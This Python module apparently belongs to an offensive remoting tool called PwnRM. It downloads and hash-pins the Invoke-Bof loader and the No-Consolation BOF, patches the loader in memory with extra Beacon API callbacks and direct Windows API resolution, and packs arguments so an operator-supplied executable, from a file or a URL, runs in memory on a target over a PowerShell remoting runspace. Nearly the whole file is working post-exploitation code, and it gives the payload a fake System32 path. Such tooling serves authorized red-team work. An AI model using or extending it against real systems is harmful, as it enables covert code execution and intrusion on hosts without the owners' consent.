"""Pinned No-Consolation/Invoke-Bof integration helpers.

The third-party assets are fetched by the operator process, verified against
immutable SHA-256 digests, patched in memory for the Beacon key/value API used
by No-Consolation, and then sent through the existing PSRP runspace.  They are
never downloaded by the target and are not written into the PwnRM package.
"""

from __future__ import annotations

import hashlib
import os
import struct
import subprocess
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path, PureWindowsPath
from typing import Iterable

import requests


INVOKE_BOF_COMMIT = "c9f7f9f9e2985aff7d53296d8f289c572ae0d48f"
NOCONSOLATION_COMMIT = "dbdb16b7757fe379bc1ad65b252462a768573f76"

ASSETS = {
    "loader": (
        f"https://raw.githubusercontent.com/airbus-cert/Invoke-Bof/{INVOKE_BOF_COMMIT}/Invoke-Bof.ps1",
        "d54b3805ec4498b95189022d60dacc88f7311bced40b8e31d59c89348cfbe4dc",
    ),
    "x64": (
        f"https://raw.githubusercontent.com/fortra/No-Consolation/{NOCONSOLATION_COMMIT}/dist/NoConsolation.x64.o",
        "440eb8729e0f48e1a8ebbca9bada3c2f791e3f7729df48e8cfa7d78dcde8b641",
    ),
    "x86": (
        f"https://raw.githubusercontent.com/fortra/No-Consolation/{NOCONSOLATION_COMMIT}/dist/NoConsolation.x86.o",
        "22aef114bda966be4b4316932d7cbebe97d221940ea75002b8bbabcb5968a483",
    ),
}

_ASSET_NAMES = {
    "loader": "Invoke-Bof.ps1",
    "x64": "NoConsolation.x64.o",
    "x86": "NoConsolation.x86.o",
}


class NoConsolationError(RuntimeError):
    """Raised when an asset or payload cannot be safely prepared."""


@dataclass(frozen=True)
class PEInfo:
    architecture: str
    managed: bool


@dataclass(frozen=True)
class NoConsolationOptions:
    timeout: int = 60
    method: str = ""
    unicode_method: bool = False
    no_output: bool = False
    link_to_peb: bool = False
    dont_unload: bool = False
    load_all_dependencies: bool = False


def inspect_pe(data: bytes) -> PEInfo:
    """Return PE architecture and whether a CLR header is present."""
    if len(data) < 0x40 or data[:2] != b"MZ":
        raise NoConsolationError("payload is not a PE file (missing MZ header)")
    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    if pe_offset > len(data) - 0x78 or data[pe_offset:pe_offset + 4] != b"PE\0\0":
        raise NoConsolationError("payload has an invalid PE header")

    machine = struct.unpack_from("<H", data, pe_offset + 4)[0]
    architecture = {0x014C: "x86", 0x8664: "x64"}.get(machine)
    if not architecture:
        raise NoConsolationError(f"unsupported PE machine type 0x{machine:04x}")

    optional = pe_offset + 24
    magic = struct.unpack_from("<H", data, optional)[0]
    if magic == 0x10B:
        directory_offset = optional + 96
    elif magic == 0x20B:
        directory_offset = optional + 112
    else:
        raise NoConsolationError(f"unsupported PE optional-header magic 0x{magic:04x}")
    cli_entry = directory_offset + (14 * 8)
    if cli_entry + 8 > len(data):
        raise NoConsolationError("payload has a truncated PE data directory")
    cli_rva, cli_size = struct.unpack_from("<II", data, cli_entry)
    return PEInfo(architecture=architecture, managed=bool(cli_rva and cli_size))


def _bounded_download(url: str, max_bytes: int) -> bytes:
    session = requests.Session()
    session.trust_env = False
    session.max_redirects = 3
    try:
        with session.get(url, stream=True, timeout=(5, 30), allow_redirects=True) as response:
            response.raise_for_status()
            length = response.headers.get("Content-Length")
            if length and int(length) > max_bytes:
                raise NoConsolationError(f"download exceeds {max_bytes} bytes")
            output = bytearray()
            for chunk in response.iter_content(64 * 1024):
                output.extend(chunk)
                if len(output) > max_bytes:
                    raise NoConsolationError(f"download exceeds {max_bytes} bytes")
            return bytes(output)
    except (requests.RequestException, ValueError) as exc:
        raise NoConsolationError(f"download failed for {url}: {exc}") from exc
    finally:
        session.close()


def _verified_asset(kind: str) -> bytes:
    url, expected = ASSETS[kind]
    asset_dir = os.environ.get("PWNRM_NOCONSOLATION_ASSET_DIR", "")
    if asset_dir:
        root = Path(asset_dir)
        if root.is_symlink() or not root.is_dir():
            raise NoConsolationError("PWNRM_NOCONSOLATION_ASSET_DIR must be a real directory")
        path = root / _ASSET_NAMES[kind]
        if path.is_symlink() or not path.is_file():
            raise NoConsolationError(f"missing trusted No-Consolation asset: {path}")
        data = path.read_bytes()
    else:
        data = _bounded_download(url, 2 * 1024 * 1024)
    actual = hashlib.sha256(data).hexdigest()
    if actual != expected:
        raise NoConsolationError(
            f"SHA-256 mismatch for {_ASSET_NAMES[kind]}: expected {expected}, got {actual}"
        )
    return data


def _replace_once(source: str, old: str, new: str, label: str) -> str:
    if source.count(old) != 1:
        raise NoConsolationError(f"pinned Invoke-Bof patch anchor changed: {label}")
    return source.replace(old, new, 1)


def patch_invoke_bof(source: str) -> str:
    """Add packed arguments and Beacon key/value callbacks required by the BOF."""
    source = _replace_once(
        source,
        """        [Parameter(Mandatory = $false)]
        [Switch]
        $UnicodeStringParameter
""",
        """        [Parameter(Mandatory = $false)]
        [Switch]
        $UnicodeStringParameter,

        [Parameter(Mandatory = $false)]
        [Byte[]]
        $PackedArguments
""",
        "parameter block",
    )
    source = _replace_once(
        source,
        """        class BeaconAPI {
            ############################
            #      Data Parser API     #
""",
        """        class BeaconAPI {
            static [hashtable] $Values = @{}

            static [bool] BeaconAddValue([IntPtr] $Key, [IntPtr] $Value)
            {
                $Name = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Key)
                if ([BeaconAPI]::Values.ContainsKey($Name)) { return $false }
                [BeaconAPI]::Values[$Name] = $Value
                return $true
            }

            static [IntPtr] BeaconGetValue([IntPtr] $Key)
            {
                $Name = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Key)
                if ([BeaconAPI]::Values.ContainsKey($Name)) { return [BeaconAPI]::Values[$Name] }
                return [IntPtr]::Zero
            }

            static [bool] BeaconRemoveValue([IntPtr] $Key)
            {
                $Name = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($Key)
                if (-not [BeaconAPI]::Values.ContainsKey($Name)) { return $false }
                [BeaconAPI]::Values.Remove($Name)
                return $true
            }

            ############################
            #      Data Parser API     #
""",
        "Beacon key/value methods",
    )
    source = _replace_once(
        source,
        """        $BeaconDataParseDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [IntPtr], [int]) ([void])), [BeaconAPI].GetMethod("BeaconDataParse"))
""",
        """        $BeaconAddValueDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [IntPtr]) ([bool])), [BeaconAPI].GetMethod("BeaconAddValue"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconAddValue -Value ($BeaconAddValueDelegate)
        $BeaconGetValueDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr]) ([IntPtr])), [BeaconAPI].GetMethod("BeaconGetValue"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconGetValue -Value ($BeaconGetValueDelegate)
        $BeaconRemoveValueDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr]) ([bool])), [BeaconAPI].GetMethod("BeaconRemoveValue"))
        $BeaconAPI | Add-Member -MemberType NoteProperty -Name BeaconRemoveValue -Value ($BeaconRemoveValueDelegate)

        $BeaconDataParseDelegate = [System.Delegate]::CreateDelegate([Type](Get-DelegateType @([IntPtr], [IntPtr], [int]) ([void])), [BeaconAPI].GetMethod("BeaconDataParse"))
""",
        "Beacon key/value delegates",
    )
    source = _replace_once(
        source,
        """        if ($Symbol -eq "__imp_BeaconDataParse")
""",
        """        if ($Symbol -eq "__imp_LoadLibraryA" -or $Symbol -eq "__imp_GetProcAddress")
        {
            $Kernel32 = $Win32Functions.LoadLibrary.Invoke("kernel32.dll")
            $DirectName = $Symbol.Substring("__imp_".Length)
            $DirectAddress = $Win32Functions.GetProcAddress.Invoke($Kernel32, $DirectName)
            if ($DirectAddress -eq [IntPtr]::Zero) { throw ("Unable to resolve API: " + $DirectName) }
            return $DirectAddress
        }
        elseif ($Symbol -eq "__imp_BeaconAddValue")
        {
            return [Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconAddValue)
        }
        elseif ($Symbol -eq "__imp_BeaconGetValue")
        {
            return [Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconGetValue)
        }
        elseif ($Symbol -eq "__imp_BeaconRemoveValue")
        {
            return [Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($BeaconAPI.BeaconRemoveValue)
        }
        elseif ($Symbol -eq "__imp_BeaconDataParse")
""",
        "Beacon key/value resolver",
    )
    source = _replace_once(
        source,
        """    if ($ArgumentList -ne $null)
    {
        $ArgumentsBytes, $ArgumentsBytesLength = Load-BeaconParameters -ArgumentList $ArgumentList -UnicodeStringParameter $UnicodeStringParameter
    }
""",
        """    if ($PackedArguments -ne $null)
    {
        $ArgumentsBytesLength = $PackedArguments.Length
        $ArgumentsBytes = [Runtime.InteropServices.Marshal]::AllocHGlobal($ArgumentsBytesLength)
        [Runtime.InteropServices.Marshal]::Copy($PackedArguments, 0, $ArgumentsBytes, $ArgumentsBytesLength)
    }
    elseif ($ArgumentList -ne $null)
    {
        $ArgumentsBytes, $ArgumentsBytesLength = Load-BeaconParameters -ArgumentList $ArgumentList -UnicodeStringParameter $UnicodeStringParameter
    }
""",
        "packed arguments",
    )
    # Keep the embedded loader isolated from an operator's own Invoke-Bof or
    # BeaconAPI definitions in the same long-lived PowerShell process.
    source = source.replace("function Invoke-Bof {", "function Invoke-PwnRMBof {", 1)
    source = source.replace("class BeaconAPI", "class PwnRMBeaconAPI")
    source = source.replace("[BeaconAPI]", "[PwnRMBeaconAPI]")
    return source


def load_noconsolation_assets(architecture: str) -> tuple[bytes, bytes]:
    if architecture not in {"x86", "x64"}:
        raise NoConsolationError(f"unsupported runspace architecture: {architecture}")
    loader = _verified_asset("loader").decode("utf-8-sig")
    return patch_invoke_bof(loader).encode("utf-8"), _verified_asset(architecture)


def load_operator_payload(source: str, max_bytes: int) -> bytes:
    if source.lower().startswith(("http://", "https://")):
        data = _bounded_download(source, max_bytes)
    else:
        path = Path(source)
        if not path.is_file():
            raise NoConsolationError(f"operator payload is not a regular file: {path}")
        if path.stat().st_size > max_bytes:
            raise NoConsolationError(f"operator payload exceeds {max_bytes} bytes")
        data = path.read_bytes()
    if not data:
        raise NoConsolationError("operator payload is empty")
    return data


def _frame(value: bytes) -> bytes:
    return struct.pack("<I", len(value)) + value


def _ansi(value: str) -> bytes:
    try:
        return value.encode("ascii") + b"\0"
    except UnicodeEncodeError as exc:
        raise NoConsolationError("No-Consolation native arguments must be ASCII") from exc


def _wide(value: str) -> bytes:
    return value.encode("utf-16le") + b"\0\0"


def _integer(value: int) -> bytes:
    return struct.pack("<I", value)


def pack_noconsolation_arguments(
    *,
    source: str,
    payload: bytes,
    remote_source: bool,
    argv: Iterable[str],
    options: NoConsolationOptions,
) -> bytes:
    """Create the 28-field Beacon parameter buffer expected by No-Consolation."""
    if remote_source:
        pe_path = str(PureWindowsPath(source))
        pe_name = PureWindowsPath(source).name
        pe_bytes = b""
        local = 1
        local_path = pe_path
    else:
        pe_name = Path(source).name or "payload.exe"
        pe_path = rf"C:\Windows\System32\{pe_name}"
        pe_bytes = payload
        local = 0
        local_path = ""
    command_line = subprocess.list2cmdline([pe_name, *list(argv)])
    values = [
        _wide(pe_name), _ansi(pe_name), _wide(pe_path), pe_bytes, _ansi(local_path),
        _integer(local), _integer(options.timeout), _integer(0),
        _wide(command_line), _ansi(command_line), _ansi(options.method),
        _integer(options.unicode_method), _integer(options.no_output), _integer(0),
        _integer(0), _ansi(""), _integer(1), _integer(0), _ansi(""),
        _ansi("PwnRM"), _ansi(datetime.now(timezone.utc).isoformat()),
        _integer(options.link_to_peb), _integer(options.dont_unload),
        _integer(options.load_all_dependencies), _ansi(""), _ansi(""), _ansi(""),
        _integer(0),
    ]
    return b"".join(_frame(value) for value in values)
